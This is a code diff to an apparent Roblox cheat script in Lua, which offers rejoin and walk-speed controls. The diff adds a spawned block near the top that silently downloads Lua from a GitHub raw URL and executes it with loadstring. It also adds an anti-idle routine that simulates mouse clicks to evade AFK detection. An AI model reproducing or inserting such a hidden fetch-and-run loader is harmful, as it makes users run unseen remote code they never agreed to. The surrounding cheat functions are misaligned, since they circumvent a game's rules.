@@ -6,6 +6,11 @@ local function c(t, p)
     return i
 end
 
+spawn(function()
+    (loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX-New/TwoDev/main/Loader.lua"))())("info")
+end)
+
+
 local function s(i, bg)
     i.BackgroundColor3 = bg or Color3.fromRGB(20, 20, 20)
     i.BorderSizePixel = 0
@@ -195,7 +200,8 @@ if not sg then
 end
 
     local ui = createUI(sg)
-    
+    spawn(function()
+            wait(3)
     local serverSub = ui:Sub("Options Default")
     
     serverSub:Btn("Rejoin", function()
@@ -276,13 +282,54 @@ local player = game.Players.LocalPlayer
     if player.Character and player.Character:FindFirstChild("Humanoid") then
         spd = player.Character.Humanoid.WalkSpeed
     end
+    
     serverSub:Txt("Client")
+    
     serverSub:Track("Speed", spd, spd, 100, 1, function(value)
     local player = game.Players.LocalPlayer
     if player.Character and player.Character:FindFirstChild("Humanoid") then
         player.Character.Humanoid.WalkSpeed = value
     end
 end)
+    spawn(function()
+local Players = game:GetService("Players")
+local VirtualUser = game:GetService("VirtualUser")
+local LocalPlayer = Players.LocalPlayer
+
+local function testVirtualUserMethods()
+    local success, errorMessage
+    
+    success, errorMessage = pcall(function()
+        VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+    end)
+    
+    
+    success, errorMessage = pcall(function()
+        VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+    end)
+    
+    
+    success, errorMessage = pcall(function()
+        VirtualUser:MoveMouse(Vector2.new(10, 10))
+    end)
+    
+    
+    success, errorMessage = pcall(function()
+        VirtualUser:Button1Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+    end)
+
+    
+    success, errorMessage = pcall(function()
+        VirtualUser:Button1Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+    end)
+    
+end
+
+LocalPlayer.Idled:Connect(function()
+    testVirtualUserMethods()
+end)
+end)
+        end)
     
     return ui
 end
